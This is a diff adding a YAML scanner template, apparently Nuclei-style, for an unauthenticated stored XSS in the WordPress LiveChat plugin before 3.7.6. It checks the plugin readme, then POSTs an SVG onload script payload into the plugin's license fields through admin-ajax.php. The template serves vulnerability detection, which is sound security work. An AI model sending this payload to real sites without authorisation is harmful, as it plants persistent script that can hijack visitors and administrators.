@@ -1,0 +1,36 @@
+id: wp-livechat-stored-xss
+brief:
+    title: WordPress LiveChat < 3.7.6 - Unauthenticated Stored XSS
+    by: 0x_Akoko
+    level: high
+    about: WordPress LiveChat plugin before < 3.7.6 lacked CSRF and authorization checks on the option update handler in the LiveChatAdmin constructor. The code ran on any POST to a wp-admin URL without Refer...
+    label:
+        - wpscan
+        - wp
+        - wp-plugin
+        - wordpress
+        - livechat
+        - xss
+        - stored-xss
+        - unauth
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/wp-live-chat-software-for-wordpress/readme.txt'
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/wp-admin/admin-ajax.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: licenseNumber=42&licenseEmail=%22%3E%3Csvg%2Fonload%3Dalert(document.domain)%3E
+      signs:
+        - "on": status
+          status:
+            - 200
+            - 400
+        - "on": word
+          has:
+            - "0"
+          in: body
+          need: all
